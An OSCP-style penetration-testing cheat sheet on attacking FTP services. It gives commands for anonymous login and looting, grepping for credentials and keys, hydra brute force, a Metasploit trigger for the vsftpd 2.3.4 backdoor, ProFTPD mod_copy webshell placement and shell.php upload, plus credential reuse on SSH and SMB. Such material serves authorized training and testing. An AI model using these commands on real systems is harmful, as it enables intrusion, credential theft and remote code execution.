# 📁 FTP — Port 21

> **File Transfer Protocol.** Cleartext file transfer. On OSCP, FTP is a **5-minute checklist, not a rabbit hole**: anon login → mirror → grep → version-check → write-test → reuse. The value is almost never *in* FTP — it's the **key/credential/source** you carry *out* into [[SSH]]/[[SMB]]/web. Servers you'll meet: vsftpd, ProFTPD, Pure-FTPd, FileZilla/IIS FTP. Ports: 21 control, 20 active data, 990 implicit FTPS.

Related: [[Credential Attacks]] · [[HTTP]] · [[Shells]] · [[Linux Privilege Escalation]]

---

## 🧠 PORT 21 → THINK

- **Anonymous login?** `anonymous:anonymous` / `ftp:ftp` (blank pass works) — instant file access.
- **What's here?** download everything; look for configs, backups, source, creds, keys.
- **Can I write?** upload a webshell **if the FTP dir == a webroot** (check [[HTTP]]).
- **Version?** banner → `searchsploit` (vsftpd 2.3.4 backdoor, ProFTPD mod_copy, etc.).
- **Creds found elsewhere?** try them here (and FTP creds elsewhere).
- **Cleartext** → sniffable, brute-friendly (watch lockouts).

---

## ⚡ QUICK TRIAGE (60 seconds)

```bash
export IP=10.10.10.10
```

```bash
nmap -p21 -sV -sC $IP                          # banner + ftp-anon script
```

```bash
ftp $IP        # try user: anonymous  pass: (blank or anonymous)
```
**Verdict:**
- `230 Login successful` on anonymous → 🟢 download everything now.
- Known vulnerable version in banner → `searchsploit` it.
- Auth required, unknown version → note it, try found creds, otherwise move on.

---

## ⏱️ ENUMERATE (anon → loot → write → brute)

```bash
# Banner + anon + system type
nc -nv $IP 21                                    # raw banner → searchsploit
```

```bash
nmap -p21 -sV --script ftp-anon,ftp-syst $IP     # anon check + OS type
```

```bash
# Anonymous login + mirror everything (anonymous / ftp, blank or 'anonymous' pass)
wget -m ftp://anonymous:anonymous@$IP/ -P ./ftp-loot   # recursive mirror
```

```bash
# interactive equivalent:
ftp $IP        #  binary  →  ls -la (dotfiles!)  →  prompt off  →  mget *
```

```bash
# Loot it
grep -riE 'pass|pwd|secret|user|apikey|conn|BEGIN RSA' ./ftp-loot
```
**Hunt for:** `.ssh/id_rsa`, `.ssh/authorized_keys`, `.bash_history`, `*.conf`/`web.config`/`wp-config.php`/`.env`, `*.sql`/`*.bak`/`*.old`/`*.zip`/`backup*`, `users.txt`/`notes.txt`/`creds*`. Use **`binary`** mode before pulling non-text files or you'll corrupt keys/binaries; always `ls -la` for hidden files.

**Write test** (anon-write is a misconfig → upload path):
```bash
curl -T test.txt -u anonymous: "ftp://$IP/"       # or in ftp:  put test.txt
```
Success + the dir is served by [[HTTP]] (webroot overlap) → upload a webshell → RCE. Also check **`chroot` off** → browse outside the FTP root, sometimes the whole filesystem (`cd ..`).

**Brute** (only if no anon; FTP has no reliable user-enum — build the userlist from SMB/web/SMTP):
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4 -f   # cleartext: low threads, mind lockouts
```

```bash
hydra -l bob   -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4          # single known user
```

**Data-channel hangs, or FTPS (990 / `AUTH TLS`)?** Use non-interactive clients:
```bash
curl -u user:pass "ftp://$IP/" --list-only        # list
```

```bash
curl -u user:pass "ftp://$IP/file" -o file        # get
```

```bash
nmap -p21 --script "ftp-* and not brute" -sV $IP  # incl. TLS scripts
```
> Passive/active stuck in the interactive client → toggle `passive`, or just use `wget`/`curl`.

---

## 🎯 EXPLOIT — version CVEs & attack vectors

```bash
searchsploit <server> <version>
```
| Vuln | Server/version | Effect |
|---|---|---|
| **vsftpd 2.3.4 backdoor** | vsftpd 2.3.4 | 🟢 smiley `:)` in user → root shell on 6200 |
| **ProFTPD mod_copy (CVE-2015-3306)** | ProFTPD 1.3.5 | 🟢 `SITE CPFR/CPTO` arbitrary copy → webshell/RCE |
| **ProFTPD 1.3.3c backdoor** | 1.3.3c | 🟡 RCE |
| Anonymous write → webroot | any | 🟢 upload webshell |

```bash
# vsftpd 2.3.4 (metasploit or manual trigger):
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $IP; run"
# ProFTPD mod_copy — copy a webshell into the webroot, then hit it via HTTP:
#   SITE CPFR /path/to/source
#   SITE CPTO /var/www/html/shell.php
```
**Priority:** 🟢 anon read→loot · 🟢 version RCE · 🟡 writable+webroot→webshell · 🟡 cred brute · 🔵 cleartext sniffing (on-path only).

---

## 🔑 LOOT → REUSE (the real payoff)

FTP rarely escalates itself — its **loot feeds the next service**:

- **`id_rsa`** → `chmod 600 id_rsa; ssh -i id_rsa user@$IP` — the jackpot.
- **Creds / DB config strings** → test the pair *everywhere*: `ssh user@$IP`, `netexec smb $IP -u u -p p`, web logins, [[MySQL]]/[[MSSQL]].
- **Source / backups** → read the web app's logic & secrets ([[HTTP]]).
- **Version RCE gave a shell?** → `whoami`/`id`, upgrade it ([[Shells]]) → [[Linux Privilege Escalation]].

See [[Credential Attacks]].

```
Port 21
 ├─ Anonymous? ─▶ download all ─▶ creds/keys ─▶ reuse (SSH/SMB/web) ✅
 ├─ Vuln version? ─▶ searchsploit ─▶ RCE (vsftpd/ProFTPD) ✅
 ├─ Writable + webroot? ─▶ upload webshell ─▶ RCE ✅
 └─ Auth only, patched ─▶ try found creds / brute ─▶ else move on
```

---

## 🔁 FOUND → NEXT

| FINDING | MEANING | NEXT ACTION | POSSIBLE RESULT | NEXT DECISION |
|---|---|---|---|---|
| Anonymous login | Free file access | mirror + `grep -ri pass\|key` | creds/keys/source | Reuse on SSH/SMB/web |
| `id_rsa` present | SSH private key | `chmod 600; ssh -i id_rsa user@IP` | shell | Enumerate + privesc |
| Writable dir | Upload possible | test webroot overlap | webshell RCE | Reverse shell |
| vsftpd 2.3.4 | Backdoor | msf vsftpd_234 | root shell | Post-exploit |
| ProFTPD 1.3.5 | mod_copy | SITE CPFR/CPTO webshell | RCE | Shell |
| Config with DB creds | DB access | login DB, reuse pw | data/creds | [[Credential Attacks]] |
| Cleartext creds captured | Reusable | test on all services | access | Reuse |

## 🚧 FAILED → NEXT

| Symptom | Do this |
|---|---|
| Anonymous denied | Try `ftp:ftp`; use creds from other services; brute with real userlist |
| Login works, dir empty | `ls -la` for dotfiles; try `cd ..` (chroot escape); check other users' dirs |
| Can't download binaries intact | Switch to `binary` mode first |
| Passive/active hangs | Toggle `passive` in the client; firewall may block data channel — use `wget`/`curl` |
| Version has no exploit | Focus on anon read/write + cred reuse; move on if none |
| Brute locks out | Stop; check policy; try only known/default creds |

---

## 📋 REFERENCE — mistakes · don't-miss · stop

**Common mistakes:** skipping `ls -la` (miss hidden `.ssh`/configs) · ASCII mode corrupting binaries/keys · not testing **write** access · not checking **webroot** overlap · skipping **credential reuse** (FTP↔SSH↔SMB↔web) · ignoring the banner version → missing an easy RCE.

**Don't miss:**
- [ ] Anonymous login (`anonymous`/blank, `ftp`/`ftp`)
- [ ] `ls -la` for hidden files (`.ssh`, configs) · `binary` mode before pulling
- [ ] Mirror everything + grep for creds/keys
- [ ] Banner version → `searchsploit`
- [ ] Test **write** access + webroot overlap
- [ ] **Reuse** all creds/keys on other services

**Stop when:** anon tried, all files pulled+grepped, version checked, write tested, and creds (if any) reused. No shell and no loot → move on; return if you find FTP creds elsewhere.

---

## 📇 EXAM CHEAT SHEET

```bash
export IP=10.10.10.10
```

```bash
nmap -p21 -sV --script ftp-anon,ftp-syst $IP
```

```bash
ftp $IP                      # anonymous / (blank) ; binary; ls -la; prompt off; mget *
```

```bash
wget -m ftp://anonymous:anonymous@$IP/          # mirror all
```

```bash
grep -riE 'pass|key|secret|conn' .              # loot
```

```bash
searchsploit <server> <version>                 # vsftpd 2.3.4 / ProFTPD mod_copy
```

```bash
curl -T shell.php -u anonymous: "ftp://$IP/"    # write test
```

```bash
hydra -L users.txt -P rockyou.txt ftp://$IP -t 4  # brute (careful)
```
**Sequence:** banner → anon login → mirror+grep → version exploit → write test → reuse creds.
**Kill shots:** vsftpd 2.3.4 / ProFTPD mod_copy RCE · anon `id_rsa` → SSH · writable webroot → webshell.
